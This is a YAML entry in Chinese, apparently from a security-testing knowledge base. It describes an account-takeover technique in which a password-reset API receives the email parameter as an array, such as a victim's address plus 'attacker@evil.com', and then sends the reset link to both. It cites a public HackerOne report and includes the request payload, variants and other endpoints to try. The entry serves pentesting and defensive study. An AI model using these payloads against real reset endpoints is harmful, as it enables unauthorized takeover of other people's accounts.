name: "密码重置邮箱参数传数组——重置链接发送到攻击者邮箱"
id: "PASSWORD_RESET_EMAIL_ARRAY_TYPE_CONFUSION"
applicable: "blackbox"
phase: "auth"
also_phases: ["input"]
tags: ["password-reset", "type-confusion", "array-injection", "ato", "account-takeover", "parameter-pollution"]
source: "https://hackerone.com/reports/322985"

# ——— L3 核心 ———

observation: "未叙述（仅结果）。no-content 公开，仅有团队摘要。"

hypothesis: "未叙述（仅结果）"

action_result: >
  成功：在密码重置请求的 email 参数中发送数组而非单个字符串，
  如 {"email_address":["admin@breadcrumb.com","attacker@evil.com"]}，
  系统将重置链接同时发送到了攻击者邮箱。
  (原文团队摘要: "The attacker was able to send a password reset link to an
  arbitrary email by sending an array of email addresses instead of a single
  email address. POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1
  with body like {\"email_address\":[\"admin@breadcrumb.com\",\"attacker@evil.com\"]}")

why_here_first: "未叙述（仅结果）"

chaining: >
  攻击者邮箱收到受害者账户的重置链接 → 点击链接重置密码 → 完整 ATO。
  无需其他漏洞串联。

# ——— 落地检查清单 ———

approach: >
  对密码重置/邮箱验证等接受邮箱参数的 API 端点，将邮箱参数从字符串改为数组
  （包含受害者邮箱和攻击者邮箱），测试系统是否将操作发送到数组中所有地址。

reasoning_chain:
  - "问：密码重置 API 的 email 参数接受什么类型？是否仅校验了字符串类型？"
  - "黑盒：将 {\"email\":\"victim@example.com\"} 改为 {\"email\":[\"victim@example.com\",\"attacker@evil.com\"]}，观察请求是否成功。"
  - "问：攻击者邮箱是否也收到了密码重置邮件？如果收到，点击链接是否可以重置受害者密码？"
  - "变种：尝试用逗号分隔 \"victim@example.com,attacker@evil.com\" 或用 email[] 数组格式。"
  - "问：其他接受邮箱的端点（邀请成员、分享链接、通知设置）是否有相同问题？"
  - "问：后端框架（Rails/Django/Express）对数组参数的解析行为是什么？是否有隐式 flatten/join？"

vuln_root: >
  后端未对 email 参数做类型校验（期望字符串但接受数组），
  邮件发送逻辑对数组做了迭代或 flatten，导致重置链接被发送到数组中所有地址。

transferable_to:
  - "任何密码重置 API 接受 JSON body 中 email 参数的应用"
  - "邀请用户/分享功能——邮箱参数从字符串改数组可能发送到额外地址"
  - "通知/Webhook 配置中的邮箱字段——同理"
  - "使用 Rails/Django 等框架的应用——框架对数组参数的宽松解析是常见根因"
  - "短信验证场景——手机号参数传数组可能发送到额外号码"

cases:
  - url: "https://hackerone.com/reports/322985"
    title: "Ability to reset password for account"
    platform: "Upserve (Breadcrumb)"
    severity: "Critical"
    note: >
      no-content 公开。团队摘要确认：密码重置 POST /api/v1/password_reset 中
      email_address 参数传数组 ["admin@breadcrumb.com","attacker@evil.com"]，
      系统将重置链接发送到攻击者邮箱，可接管任意账户。
